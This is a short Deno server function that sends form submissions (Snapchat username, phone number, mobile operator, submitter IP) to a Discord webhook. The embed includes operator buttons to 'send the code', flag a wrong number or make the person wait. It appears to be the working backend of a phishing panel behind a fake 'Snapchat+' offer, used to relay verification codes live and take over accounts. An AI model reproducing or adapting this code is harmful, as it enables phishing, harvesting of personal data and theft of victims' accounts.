import { createClient } from 'npm:@base44/sdk@0.8.31';

const DISCORD_WEBHOOK = Deno.env.get("DISCORD_WEBHOOK");

Deno.serve(async (req) => {
  const authHeader = req.headers.get("authorization") || "";
  const token = authHeader.replace("Bearer ", "");
  const expectedToken = Deno.env.get("WEBHOOK_SECRET");
  if (expectedToken && token !== expectedToken) {
    return Response.json({ error: "Unauthorized" }, { status: 401 });
  }

  const base44 = createClient({ appId: Deno.env.get("BASE44_APP_ID") });
  const body = await req.json();
  const { snapchat, telephone, operateur, submissionId } = body;

  const formatPhone = (tel) => tel.replace(/(\d{2})(?=\d)/g, '$1 ').trim();

  const ip = req.headers.get("x-forwarded-for")?.split(",")[0]?.trim() || "Inconnue";
  const operatorColors = { SFR: 16711680, Bouygues: 3447003, Orange: 16753920 };

  const now = new Date();
  const dateStr = now.toLocaleDateString("fr-FR", {
    weekday: "long", day: "numeric", month: "long", year: "numeric",
    hour: "2-digit", minute: "2-digit", second: "2-digit",
    timeZone: "Europe/Paris"
  });

  const appUrl = Deno.env.get("APP_URL")?.replace(/\/$/, "") || "https://snap-post-hub.base44.app";
  const triggerUrl = `${appUrl}/?trigger=${submissionId}`;
  const wrongUrl = `${appUrl}/?triggerAction=wrong&id=${submissionId}`;
  const waitUrl = `${appUrl}/?triggerAction=wait&id=${submissionId}`;

  const embed = {
    title: "📱 Nouvelle soumission Snapchat+",
    color: operatorColors[operateur] || 16776960,
    fields: [
      { name: "👤 Utilisateur", value: `@${snapchat}`, inline: true },
      { name: "📡 Opérateur", value: operateur, inline: true },
      { name: "📞 Numéro", value: formatPhone(telephone), inline: true },
      { name: "🕵️ Adresse IP", value: `\`${ip}\``, inline: false },
      { name: "🕐 Date de soumission", value: dateStr, inline: false },
      {
        name: "⚡ Actions",
        value: `✅ [**Envoyer le code**](${triggerUrl})\n❌ [**Mauvais numéro**](${wrongUrl})\n⏳ [**Faire patienter**](${waitUrl})`,
        inline: false
      },
    ],
    footer: { text: `ID: ${submissionId || "N/A"}` },
    timestamp: now.toISOString(),
  };

  await fetch(DISCORD_WEBHOOK, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ content: "@everyone", embeds: [embed] }),
  });

  return Response.json({ ok: true });
});